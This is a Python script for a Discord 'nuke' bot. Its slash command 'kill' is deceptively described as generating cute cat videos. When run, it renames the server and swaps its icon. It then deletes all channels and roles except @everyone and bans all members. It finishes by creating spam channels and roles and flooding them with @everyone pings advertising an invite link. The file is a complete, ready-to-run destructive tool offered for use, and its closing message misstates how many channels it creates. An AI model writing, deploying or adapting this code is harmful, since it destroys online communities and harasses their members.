import discord
from discord.ext import commands
import aiohttp
import asyncio

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.guilds = True
intents.guild_messages = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("Commands synced")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

async def handle_rate_limit(func, *args, **kwargs):
    retry_count = 0
    max_retries = 5
    while retry_count < max_retries:
        try:
            return await func(*args, **kwargs)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_count += 1
                retry_after = e.retry_after
                print(f"Rate limited. Retrying in {retry_after:.2f} seconds...")
                await asyncio.sleep(retry_after)
            else:
                raise e
    raise Exception("Max retries reached for rate-limited operation")

async def send_messages_concurrently(channels, message, max_concurrent):
    for i in range(0, len(channels), max_concurrent):
        batch = channels[i:i + max_concurrent]
        tasks = [handle_rate_limit(channel.send, message) for channel in batch if isinstance(channel, discord.TextChannel)]
        await asyncio.gather(*tasks)

@bot.tree.command(name="kill", description="Generates Cute Cat Videos!") # Command Name and Description
async def kill(interaction: discord.Interaction):
    guild = interaction.guild

    if guild is None:
        await interaction.response.send_message("This command must be used in a guild.", ephemeral=True)
        return

    await interaction.response.send_message("Processing your request...", ephemeral=True)

    print(f"Kill command received from {interaction.user} in guild {guild.name} ({guild.id})")

    try:
        await handle_rate_limit(guild.edit, name="BEAMED") # Server Name
        print("Server name changed to BEAMED")

        icon_url = "SERVER_ICON_URL" # Server Icon URL
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as response:
                icon_bytes = await response.read()
                await handle_rate_limit(guild.edit, icon=icon_bytes)
        print("Server icon changed")

        for channel in guild.channels:
            try:
                await handle_rate_limit(channel.delete)
                print(f"Deleted channel {channel.name} ({channel.id})")
            except discord.HTTPException as e:
                print(f"Failed to delete channel {channel.name} ({channel.id}): {e}")

        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await handle_rate_limit(role.delete)
                    print(f"Deleted role {role.name} ({role.id})")
                except discord.HTTPException as e:
                    print(f"Failed to delete role {role.name} ({role.id}): {e}")

        for member in guild.members:
            try:
                await handle_rate_limit(member.ban, reason="Kill command used")
                print(f"Banned user {member.name} ({member.id})")
            except discord.HTTPException as e:
                print(f"Failed to ban user {member.name} ({member.id}): {e}")

        base_name = "BEAMED" # channel name
        new_channels = []
        for _ in range(30): # number of new channels
            try:
                channel = await handle_rate_limit(guild.create_text_channel, base_name)
                new_channels.append(channel)
                print(f"Created new channel '{base_name}'")
            except discord.HTTPException as e:
                print(f"Failed to create channel '{base_name}': {e}")

        new_roles = []
        for _ in range(30):
            try:
                role = await handle_rate_limit(guild.create_role, name="BEAMED") # Role Name
                new_roles.append(role)
                print(f"Created new role")
            except discord.HTTPException as e:
                print(f"Failed to create role: {e}")

        all_channels = list(guild.channels) + new_channels
        
        await send_messages_concurrently(all_channels, "@everyone BEAMED BY https://discord.gg/Q56VMd6YYR", 100) # Message sent to all channels

        await interaction.followup.send("All channels, roles, and users have been deleted and banned. The server name and icon have been changed, and 10 new channels and roles have been created with messages sent.")

    except discord.HTTPException as e:
        print(f"Failed to execute command: {e}")
        if interaction.response.is_done():
            try:
                await interaction.followup.send(f"An error occurred while executing the command: {e}", ephemeral=True)
            except discord.HTTPException as send_error:
                print(f"Failed to send error message: {send_error}")
        else:
            try:
                await interaction.response.send_message(f"An error occurred while executing the command: {e}", ephemeral=True)
            except discord.HTTPException as send_error:
                print(f"Failed to send initial error message: {send_error}")

bot.run("TOKEN") # paste your token here
